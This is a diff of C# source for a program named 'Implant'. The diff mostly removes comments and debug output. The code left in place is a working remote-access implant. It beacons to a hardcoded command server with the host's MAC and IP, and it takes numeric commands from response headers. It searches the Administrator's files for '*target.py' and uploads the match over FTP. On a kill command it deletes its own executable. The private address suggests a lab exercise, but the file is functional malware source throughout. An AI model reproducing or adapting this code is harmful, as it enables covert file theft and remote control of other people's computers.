@@ -1,5 +1,4 @@
 using System.Net;
-// using System.Net.Http;
 using System.Net.NetworkInformation;
 using System;
 using System.IO;
@@ -15,15 +14,14 @@ using System.Runtime.InteropServices;
 namespace Implant
 {
     class Connection {
-        static string cmd = "0"; // Current command
-        static string srvip = "192.168.68.128"; // Server IP (passed in)
-        static string ftpserv = ""; // FTP Server
-        static string ftpuser = ""; // FTP User
-        static string ftppass = ""; // FTP Password
-        static int timeout = 30; // Seconds between heartbeats
+        static string cmd = "0"; 
+        static string srvip = "192.168.68.128"; 
+        static string ftpserv = ""; 
+        static string ftpuser = ""; 
+        static string ftppass = ""; 
+        static int timeout = 30; 
 
 
-        // FTP Connection, uploading file at location file_loc
         static void ExfilData(string ip, string user, string pass, string file_loc)
         {
           try{
@@ -49,13 +47,11 @@ namespace Implant
           }
           catch (Exception ex)
           {
-             // Console.WriteLine(ex.Message.ToString());
           }
 
 
         }
 
-        // Gets the machine's MAC address
         static string GetMAC()
         {
           string macAddr =
@@ -67,7 +63,6 @@ namespace Implant
           return macAddr;
         }
 
-        // Gets the machine's IP
         static string GetIP()
         {
           string content;
@@ -83,8 +78,6 @@ namespace Implant
           return lines[0];
         }
 
-        // Initiate an HTTP connection, then read the command from it.
-        // If the IP address given is invalid, this will just hang until it times out .
         static void Register()
         {
           string MAC = GetMAC();
@@ -103,16 +96,13 @@ namespace Implant
           var response = (HttpWebResponse)client.GetResponse();
           cmd = response.GetResponseHeader("cmd");
           string responseText;
-          // Console.WriteLine("Registration sent, response:");
           using (StreamReader sr = new StreamReader(response.GetResponseStream()))
           {
             responseText = sr.ReadToEnd();
           }
-          // Console.WriteLine(responseText);
           return;
         }
 
-        // The HTTP request for the Exfil info
         static void Exfil(int Found, string file_loc)
         {
           string MAC = GetMAC();
@@ -129,13 +119,11 @@ namespace Implant
             stream.Write(data, 0, data.Length);
           }
           var response = (HttpWebResponse)client.GetResponse();
-          // Console.WriteLine("Exfil message sent, response: ");
           string responseText;
           using (StreamReader sr = new StreamReader(response.GetResponseStream()))
           {
             responseText = sr.ReadToEnd();
           }
-          // Console.WriteLine(responseText);
 
           cmd = response.GetResponseHeader("cmd");
           if(Found == 1) {
@@ -147,7 +135,6 @@ namespace Implant
           return;
         }
 
-        // The periodic heartbeat request
         static void HeartBeat()
         {
           string MAC = GetMAC();
@@ -164,18 +151,15 @@ namespace Implant
           }
           var response = (HttpWebResponse)client.GetResponse();
           cmd = response.GetResponseHeader("cmd");
-          // Console.WriteLine("Heartbeat sent, response: ");
           string responseText;
           using (StreamReader sr = new StreamReader(response.GetResponseStream()))
           {
             responseText = sr.ReadToEnd();
           }
-          // Console.WriteLine(responseText);
 
           return;
         }
 
-        // The acknowledgement of the kill command (doesn't read response)
         static void KillMsg()
         {
           string MAC = GetMAC();
@@ -191,15 +175,11 @@ namespace Implant
             stream.Write(data, 0, data.Length);
           }
           client.GetResponse();
-          // Console.WriteLine("Kill acknowledgement sent.");
           return;
         }
 
-        // Kills and deletes the program file
-        // Starts a command line (async) to delete the file after five seconds, then kills the process
         static void Kill()
         {
-          // Console.WriteLine("Killing.");
           Process.Start( new ProcessStartInfo()
           {
               Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath +"\"",
@@ -211,21 +191,16 @@ namespace Implant
 
           Environment.Exit(0);
         }
-
-        // Search the entire home directory for a file called target.py, then Exfil
         static void FileSearch()
         {
-          // Console.WriteLine("Searching...");
           string[] filelist = Directory.GetFiles(@"C:\Documents and Settings\Administrator", "*target.py", SearchOption.AllDirectories);
           if(filelist.Length == 0)
           {
-            // Console.WriteLine("File not found.");
             Exfil(0, "");
 
           }
           else
           {
-            // Console.WriteLine("File found at " + filelist[0]);
             Exfil(1, filelist[0]);
           }
           return;
@@ -233,13 +208,8 @@ namespace Implant
 
         static void Main(string[] args)
         {
-
-          // Console.WriteLine("DEBUG: IP - " + (string)GetIP());
-          // Console.WriteLine("DEBUG: MAC - " + (string)GetMAC());
-
-          Register(); // will hang if server ip not valid
+          Register();
           while (true) {
-            // Console.WriteLine(cmd);
             switch(cmd) {
               case "0":
                 System.Threading.Thread.Sleep(timeout);
@@ -251,7 +221,7 @@ namespace Implant
               case "2":
                 KillMsg();
                 Kill();
-                break; //should be unreachable but w/e
+                break; 
               default:
                 cmd = "0";
                 break;
